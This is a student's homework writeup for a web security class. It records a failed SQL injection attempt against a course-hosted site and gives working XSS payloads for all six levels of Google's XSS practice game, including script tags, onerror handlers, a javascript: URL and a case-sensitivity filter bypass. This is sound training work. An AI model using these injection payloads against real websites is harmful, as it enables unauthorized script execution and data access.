# Writeup 1 - Web I

Name: *PUT YOUR NAME HERE*
Section: *PUT YOUR SECTION NUMBER HERE*

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.

Digital acknowledgement: *PUT YOUR NAME HERE*


## Assignment details
This assignment has two parts. It is due by 11/27/19 at 11:59PM.

**There will be late penalty of 5% per day late!**

### Part 1 (40 Pts)

Such a Quick Little, website!

[http://142.93.136.81:5000/](http://142.93.136.81:5000/)
I was unable to figure this out. My 
"http://142.93.136.81:5000/item?id=1" O/**/R% 1=1;--
did not work to find the flag.
### Part 2 (60 Pts)
Complete all 6 levels of:

[https://xss-game.appspot.com](https://xss-game.appspot.com)

Produce a writeup. We will not take off points for viewing the source code and/or viewing hints, but we strongly discourage reading online write-ups as that defeats the purpose of the homework.

Level 1: <script>alert('xxs')</script> Calls a basic alert script.
Level 2: <img href=xss-game.appspot.com/dog.jpg onerror="alert(xss)"> It tries to find an image, then triggers the on error alert.
Level 3: level3/frame#3' onerror='alert(0)'; Same as above. 3' is an invalid image.
Level 4: level4/frame?timer=')%3Balert(1)%3Bvar c=(' Escapes the code for the start-timer function, then triggers an alert.
Level 5: level5/frame/signup?next=javascript:alert(1) Changing the url causes the submit button to trigger an alert.
Level 6: level6/frame#HTTpS://google.com/jsapi?callback=alert The regex doesn't filter mixed uppercase or lowercase https domains. jaspi?callback=alert is an alert script.

### Format

Part 1 and 2 can be answered in bullet form or full, grammatical sentences.



### Scoring

* Part 1 is worth 40 points
* Part 2 is worth 60 points

### Tips

Remember to document your thought process for maximum credit!

Review the slides for help with using any of the tools or libraries discussed in
class.
